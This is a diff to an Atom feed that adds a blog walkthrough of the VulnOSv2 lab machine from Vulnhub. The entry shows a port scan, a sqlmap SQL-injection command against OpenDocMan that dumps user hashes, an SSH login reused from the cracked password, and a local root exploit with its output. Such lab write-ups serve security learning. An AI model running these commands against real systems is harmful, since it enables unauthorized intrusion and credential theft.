@@ -4,7 +4,7 @@
   <title><![CDATA[tick.Tack]]></title>
   <link href="http://newdominic.github.io/atom.xml" rel="self"/>
   <link href="http://newdominic.github.io/"/>
-  <updated>2016-06-19T11:59:43+08:00</updated>
+  <updated>2016-06-19T20:30:51+08:00</updated>
   <id>http://newdominic.github.io/</id>
   <author>
     <name><![CDATA[DMC]]></name>
@@ -12,6 +12,116 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[VulnOS]]></title>
+    <link href="http://newdominic.github.io/blog/2016/06/18/vulnosv2/"/>
+    <updated>2016-06-18T18:00:45+08:00</updated>
+    <id>http://newdominic.github.io/blog/2016/06/18/vulnosv2</id>
+    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/vulnos-2,147/">VulnOSv2: 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<p>Nmap scan result</p>
+
+<pre><code>Nmap scan report for 192.168.0.110
+Host is up (0.00042s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+6667/tcp open  irc
+MAC Address: 08:00:27:33:5D:E9 (Cadmus Computer Systems)
+</code></pre>
+
+<h2>Limited Shell</h2>
+
+<p>The index page is the introduction of VulnOSv2, which tells us the target website is under /jabc.</p>
+
+<p><img src="http://newdominic.github.io/images/2016-06-19-vulnosv2/1.png"></p>
+
+<p>By examining the source code, we can see that the website is based on Drupal 7. But none of existing exploits could work.</p>
+
+<p>Then I turned to navigate every pages. Finally, when I visited the <strong>Documentation</strong> page, I found some hidden words here. Which tells the customers to visit /jabcd0cs/.</p>
+
+<p><img src="http://newdominic.github.io/images/2016-06-19-vulnosv2/2.png"></p>
+
+<p>The /jabcd0cs/ is running OpenDocMan with version 1.2.7, which is vulnerable to SQL injection. There&rsquo;s already an PoC <a href="https://www.exploit-db.com/exploits/32075/">here</a>.</p>
+
+<p>Since the <strong>add_value</strong> is exploitable, I&rsquo;ll left the exploit work to <strong>sqlmap</strong>.</p>
+
+<pre><code># sqlmap -u 'http://192.168.0.110/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user' -p add_value --dump-all
+---snip---
+Database: jabcd0cs
+Table: odm_user
+[2 entries]
++----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
+| id | phone       | Email              | username | password                                 | last_name | first_name | department | pw_reset_code |
++----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
+| 1  | 5555551212  | webmin@example.com | webmin   | b78aae356709f8c31118ea613980954b         | min       | web        | 2          | &lt;blank&gt;       |
+| 2  | 555 5555555 | guest@example.com  | guest    | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest     | guest      | 2          | NULL          |
++----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
+---snip---
+</code></pre>
+
+<p>Sqlmap has cracked the password of <strong>guest</strong> for us. After throwing <strong>webmin</strong>&rsquo;s hashed password into an online md5 cracker, it returned &ldquo;<strong>webmin1980</strong>&rdquo; as result.</p>
+
+<p>There&rsquo;s nothing more I can do with OpenDocMan even logged in as <strong>webmin</strong>. So I decided to take a try on <strong>Password Reuse Attack</strong>.</p>
+
+<pre><code># ssh webmin@192.168.0.110
+webmin@192.168.0.110's password:
+Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Sun Jun 19 11:25:46 CEST 2016
+
+  System load:  0.0               Processes:           86
+  Usage of /:   5.8% of 29.91GB   Users logged in:     0
+  Memory usage: 18%               IP address for eth0: 192.168.0.110
+  Swap usage:   0%
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Last login: Sun Jun 19 11:25:46 2016 from 192.168.0.105
+$
+</code></pre>
+
+<h2>Privilege Escalation</h2>
+
+<p>As the welcome messages says:</p>
+
+<pre><code>Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)
+</code></pre>
+
+<p>Escalating privilege to <strong>root</strong> will be easily done with this <a href="https://www.exploit-db.com/exploits/37292/">exploit</a>.</p>
+
+<pre><code>$ gcc -o exploit 37292.c
+$ chmod +x exploit
+$ ./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(webmin)
+# cat /root/flag.txt
+Hello and welcome.
+You successfully compromised the company "JABC" and the server completely !!
+Congratulations !!!
+Hope you enjoyed it.
+
+What do you think of A.I.?
+#
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Milnet: 1]]></title>
